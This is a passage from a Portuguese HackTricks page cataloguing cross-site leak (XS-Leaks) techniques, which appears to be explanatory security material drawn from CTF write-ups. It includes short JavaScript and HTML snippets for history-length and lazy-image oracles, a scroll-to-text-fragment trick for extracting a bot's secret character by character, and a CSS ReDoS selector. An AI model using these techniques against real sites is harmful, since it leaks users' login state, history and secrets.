* **Resumo**: Se o cabe√ßalho de Origem for refletido no cabe√ßalho `Access-Control-Allow-Origin`, √© poss√≠vel verificar se um recurso j√° est√° em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Caso o **cabe√ßalho de Origem** seja **refletido** no cabe√ßalho `Access-Control-Allow-Origin`, um atacante pode abusar desse comportamento para tentar **buscar** o **recurso** no modo **CORS**. Se um **erro n√£o for acionado**, significa que ele foi **recuperado corretamente da web**; se um erro for **acionado**, √© porque ele foi **acessado do cache** (o erro aparece porque o cache salva uma resposta com um cabe√ßalho CORS permitindo o dom√≠nio original e n√£o o dom√≠nio do atacante)**.**\
Observe que se a origem n√£o for refletida, mas um caractere curinga for usado (`Access-Control-Allow-Origin: *`), isso n√£o funcionar√°.

## T√©cnica de Atributos Leg√≠veis

### Redirecionamento Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumo:** GC e SA permitem verificar o tipo de resposta (redirecionamento opaco) ap√≥s o t√©rmino do redirecionamento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Ao enviar uma solicita√ß√£o usando a Fetch API com `redirect: "manual"` e outros par√¢metros, √© poss√≠vel ler o atributo `response.type` e, se for igual a `opaqueredirect`, ent√£o a resposta foi um redirecionamento.

### COOP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumo:** P√°ginas protegidas pela Pol√≠tica de Origem Cruzada do Opener (COOP) impedem o acesso de intera√ß√µes de origem cruzada.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Um atacante √© capaz de deduzir a presen√ßa do cabe√ßalho Pol√≠tica de Origem Cruzada do Opener (COOP) em uma resposta HTTP de origem cruzada. O COOP √© utilizado por aplicativos da web para impedir que sites externos obtenham refer√™ncias de janela arbitr√°rias. A visibilidade desse cabe√ßalho pode ser discernida ao tentar acessar a **refer√™ncia `contentWindow`**. Em cen√°rios em que o COOP √© aplicado condicionalmente, a **propriedade `opener`** se torna um indicador revelador: ela √© **indefinida** quando o COOP est√° ativo e **definida** em sua aus√™ncia.

### Comprimento M√°ximo de URL - Lado do Servidor

* **M√©todos de Inclus√£o**: Fetch API, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumo:** Detectar diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento pode ser muito grande, fazendo com que o servidor responda com um erro e gere um alerta.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se um redirecionamento do lado do servidor usa **entrada do usu√°rio dentro do redirecionamento** e **dados extras**. √â poss√≠vel detectar esse comportamento porque geralmente os **servidores** t√™m um **limite de comprimento de solicita√ß√£o**. Se os **dados do usu√°rio** tiverem esse **comprimento - 1**, porque o **redirecionamento** est√° usando **esses dados** e **adicionando** algo **extra**, ele acionar√° um **erro detect√°vel por meio de Eventos de Erro**.

Se voc√™ conseguir definir cookies para um usu√°rio, tamb√©m pode realizar esse ataque **definindo cookies suficientes** ([**cookie bomba**](hacking-with-cookies/cookie-bomb.md)) para que, com o **aumento do tamanho da resposta correto**, um **erro** seja acionado. Nesse caso, lembre-se de que se voc√™ acionar essa solicita√ß√£o de um mesmo site, `<script>` enviar√° automaticamente os cookies (para que voc√™ possa verificar os erros).\
Um exemplo do **cookie bomba + XS-Search** pode ser encontrado na solu√ß√£o pretendida deste artigo: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou estar no mesmo contexto geralmente √© necess√°rio para esse tipo de ataque.

### Comprimento M√°ximo de URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo:** Detectar diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento pode ser muito grande para uma solicita√ß√£o, de modo que uma diferen√ßa possa ser notada.
* **Exemplo de C√≥digo**: [https://ctf
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo:** Avalie a quantidade de elementos iframe inspecionando a propriedade `window.length`.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em um site** aberto via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio sobre essa p√°gina**.\
Al√©m disso, se a p√°gina sempre tiver o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com a **contagem de frames** porque um `embed` √© usado internamente. Existem [Par√¢metros de URL Abertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permitem algum controle sobre o conte√∫do, como `zoom`, `view`, `page`, `toolbar`, onde essa t√©cnica poderia ser interessante.

### HTMLElements

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumo:** Leia o valor vazado para distinguir entre 2 estados poss√≠veis
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Vazamento de informa√ß√µes por meio de elementos HTML √© uma preocupa√ß√£o na seguran√ßa da web, especialmente quando arquivos de m√≠dia din√¢micos s√£o gerados com base em informa√ß√µes do usu√°rio, ou quando marcas d'√°gua s√£o adicionadas, alterando o tamanho da m√≠dia. Isso pode ser explorado por atacantes para diferenciar entre poss√≠veis estados, analisando as informa√ß√µes expostas por certos elementos HTML.

### Informa√ß√µes Expostas por Elementos HTML

- **HTMLMediaElement**: Este elemento revela os tempos de `dura√ß√£o` e `buffered` da m√≠dia, que podem ser acessados por meio de sua API.
[Leia mais sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Ele exp√µe `videoHeight` e `videoWidth`. Em alguns navegadores, propriedades adicionais como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount` est√£o dispon√≠veis, oferecendo informa√ß√µes mais detalhadas sobre o conte√∫do da m√≠dia.
[Leia mais sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Esta fun√ß√£o fornece detalhes sobre a qualidade de reprodu√ß√£o de v√≠deo, incluindo `totalVideoFrames`, que pode indicar a quantidade de dados de v√≠deo processados.
[Leia mais sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Este elemento vaza a `altura` e `largura` de uma imagem. No entanto, se uma imagem for inv√°lida, essas propriedades retornar√£o 0, e a fun√ß√£o `image.decode()` ser√° rejeitada, indicando a falha ao carregar a imagem corretamente.
[Leia mais sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propriedade CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumo:** Identifique varia√ß√µes no estilo do site que se correlacionam com o estado ou status do usu√°rio.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplica√ß√µes web podem alterar o **estilo do site** dependendo do **status do usu√°rio**. Arquivos CSS de origens cruzadas podem ser incorporados na p√°gina do atacante com o **elemento de link HTML**, e as **regras** ser√£o **aplicadas** √† p√°gina do atacante. Se uma p√°gina altera dinamicamente essas regras, um atacante pode **detectar** essas **diferen√ßas** dependendo do estado do usu√°rio.\
Como t√©cnica de vazamento, o atacante pode usar o m√©todo `window.getComputedStyle` para **ler propriedades CSS** de um elemento HTML espec√≠fico. Como resultado, um atacante pode ler propriedades CSS arbitr√°rias se o elemento afetado e o nome da propriedade forem conhecidos.

### Hist√≥rico CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumo:** Detecte se o estilo `:visited` √© aplicado a uma URL, indicando que ela j√° foi visitada
* **Exemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
De acordo com [**este**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), isso n√£o funciona no Chrome headless.
{% endhint %}

O seletor CSS `:visited` √© utilizado para estilizar URLs de forma diferente se elas foram visitadas anteriormente pelo usu√°rio. No passado, o m√©todo `getComputedStyle()` poderia ser usado para identificar essas diferen√ßas de estilo. No entanto, os navegadores modernos implementaram medidas de seguran√ßa para evitar que esse m√©todo revele o estado de um link. Essas medidas incluem sempre retornar o estilo calculado como se o link fosse visitado e restringir os estilos que podem ser aplicados com o seletor `:visited`.

Apesar dessas restri√ß√µes, √© poss√≠vel discernir indiretamente o estado visitado de um link. Uma t√©cnica envolve enganar o usu√°rio para interagir com uma √°rea afetada pelo CSS, especificamente utilizando a propriedade `mix-blend-mode`. Essa propriedade permite a mistura de elementos com seu plano de fundo, potencialmente revelando o estado visitado com base na intera√ß√£o do usu√°rio.

Al√©m disso, a detec√ß√£o pode ser alcan√ßada sem intera√ß√£o do usu√°rio, explorando os tempos de renderiza√ß√£o de links. Como os navegadores podem renderizar links visitados e n√£o visitados de forma diferente, isso pode introduzir uma diferen√ßa de tempo mensur√°vel na renderiza√ß√£o. Um exemplo de prova de conceito (PoC) foi mencionado em um relat√≥rio de bug do Chromium, demonstrando essa t√©cnica usando v√°rios links para amplificar a diferen√ßa de tempo, tornando assim o estado visitado detect√°vel por meio de an√°lise de tempo.

Para mais detalhes sobre essas propriedades e m√©todos, visite suas p√°ginas de documenta√ß√£o:
- `:visited`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Vazamento de X-Frame do ContentDocument

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumo:** No Google Chrome, uma p√°gina de erro dedicada √© exibida quando uma p√°gina √© bloqueada de ser incorporada em um site de origem cruzada devido a restri√ß√µes de X-Frame-Options.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

No Chrome, se uma p√°gina com o cabe√ßalho `X-Frame-Options` definido como "deny" ou "same-origin" for incorporada como um objeto, uma p√°gina de erro aparecer√°. O Chrome retorna exclusivamente um objeto de documento vazio (em vez de `null`) para a propriedade `contentDocument` desse objeto, ao contr√°rio de iframes ou outros navegadores. Os atacantes poderiam explorar isso detectando o documento vazio, potencialmente revelando informa√ß√µes sobre o estado do usu√°rio, especialmente se os desenvolvedores definirem inconsistentemente o cabe√ßalho X-Frame-Options, muitas vezes ignorando p√°ginas de erro. A conscientiza√ß√£o e a aplica√ß√£o consistente de cabe√ßalhos de seguran√ßa s√£o cruciais para evitar vazamentos desse tipo.

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

O cabe√ßalho `Content-Disposition`, especificamente `Content-Disposition: attachment`, instrui o navegador a baixar o conte√∫do em vez de exibi-lo inline. Esse comportamento pode ser explorado para detectar se um usu√°rio tem acesso a uma p√°gina que aciona um download de arquivo. Nos navegadores baseados em Chromium, existem algumas t√©cnicas para detectar esse comportamento de download:

1. **Monitoramento da Barra de Download**:
- Quando um arquivo √© baixado em navegadores baseados em Chromium, uma barra de download aparece na parte inferior da janela do navegador.
- Monitorando as altera√ß√µes na altura da janela, os atacantes podem inferir a apari√ß√£o da barra de download, sugerindo que um download foi iniciado.

2. **Navega√ß√£o de Download com Iframes**:
- Quando uma p√°gina aciona um download de arquivo usando o cabe√ßalho `Content-Disposition: attachment`, isso n√£o causa um evento de navega√ß√£o.
- Carregando o conte√∫do em um iframe e monitorando os eventos de navega√ß√£o, √© poss√≠vel verificar se a disposi√ß√£o de conte√∫do causa um download de arquivo (sem navega√ß√£o) ou n√£o.

3. **Navega√ß√£o de Download sem Iframes**:
- Semelhante √† t√©cnica de iframe, esse m√©todo envolve o uso de `window.open` em vez de um iframe.
- Monitorando os eventos de navega√ß√£o na janela rec√©m-aberta, √© poss√≠vel revelar se um download de arquivo foi acionado (sem navega√ß√£o) ou se o conte√∫do √© exibido inline (ocorre navega√ß√£o).

Em cen√°rios em que apenas usu√°rios logados podem acionar esses downloads, essas t√©cnicas podem ser usadas para inferir indiretamente o estado de autentica√ß√£o do usu√°rio com base na resposta do navegador √† solicita√ß√£o de download.

### Bypass de Cache HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Por isso essa t√©cnica √© interessante: o Chrome agora possui **particionamento de cache**, e a chave de cache da p√°gina rec√©m-aberta √©: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mas se eu abrir uma p√°gina ngrok e usar fetch nela, a chave de cache ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, a **chave de cache √© diferente**, ent√£o a cache n√£o pode ser compartilhada. Voc√™ pode encontrar mais detalhes aqui: [Ganho de seguran√ßa e privacidade por meio do particionamento de cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Coment√°rio de [**aqui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se um site `exemplo.com` incluir um recurso de `*.exemplo.com/recurso`, ent√£o esse recurso ter√° a **mesma chave de cache** como se o recurso fosse solicitado diretamente por meio de navega√ß√£o de n√≠vel superior. Isso ocorre porque a chave de cache √© composta pelo _eTLD+1_ de n√≠vel superior e _eTLD+1_ do frame.

Como acessar o cache √© mais r√°pido do que carregar um recurso, √© poss√≠vel tentar alterar a localiza√ß√£o de uma p√°gina e cancel√°-la 20ms (por exemplo) depois. Se a origem foi alterada ap√≥s a parada, significa que o recurso estava em cache.\
Ou poderia apenas **enviar alguns fetch para a p√°gina potencialmente em cache e medir o tempo que leva**.

### Redirecionamento Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumo:** √â poss√≠vel descobrir se a resposta a uma solicita√ß√£o fetch √© um redirecionamento
* **Exemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch com AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumo:** √â poss√≠vel tentar carregar um recurso e interromper antes que seja carregado. Dependendo se um erro √© acionado, o recurso foi ou n√£o foi armazenado em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Use _**fetch**_ e _**setTimeout**_ com um **AbortController** para detectar se o **recurso est√°
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres aleat√≥rios** (Por exemplo **milhares de "W"s**) para **preencher a p√°gina da web antes do segredo ou adicionar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Ent√£o, se por exemplo a **inje√ß√£o aparecer antes da flag**, a **imagem** ser√° **carregada**, mas se aparecer **depois** da **flag**, a flag + o lixo ir√£o **impedir que seja carregada** (voc√™ precisar√° ajustar a quantidade de lixo a ser colocada). Isso √© o que aconteceu neste [**writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Outra op√ß√£o seria usar o **scroll-to-text-fragment** se permitido:

#### Scroll-to-text-fragment

No entanto, fa√ßa o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina da web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres maliciosos do atacante e a imagem de carregamento lento e ent√£o o segredo do bot √© adicionado.

O que este texto far√° √© fazer o bot acessar qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° logo abaixo da imagem, a **imagem s√≥ ser√° carregada se o segredo adivinhado estiver correto**. Assim, voc√™ tem seu or√°culo para **exfiltrar o segredo caractere por caractere**.

Alguns exemplos de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carregamento Lento de Imagem Baseado em Tempo

Se **n√£o for poss√≠vel carregar uma imagem externa** que poderia indicar ao atacante que a imagem foi carregada, outra op√ß√£o seria tentar **adivinhar o caractere v√°rias vezes e medir isso**. Se a imagem for carregada, todas as solicita√ß√µes levar√£o mais tempo do que se a imagem n√£o for carregada. Isso √© o que foi usado na [**solu√ß√£o deste artigo**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqui:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se `jQuery(location.hash)` √© usado, √© poss√≠vel descobrir via tempo se algum conte√∫do HTML existe, isso ocorre porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o √© necess√°rio verificar o restante dos **seletores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inje√ß√£o de CSS

{% content-ref url="xs-search/css-injection/" %}
[inje√ß√£o-de-css](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Existem mitiga√ß√µes recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tamb√©m em cada se√ß√£o do wiki [https://xsleaks.dev/](https://xsleaks.dev/). D√™ uma olhada l√° para mais informa√ß√µes sobre como se proteger contra essas t√©cnicas.

## Refer√™ncias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas comunit√°rias mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
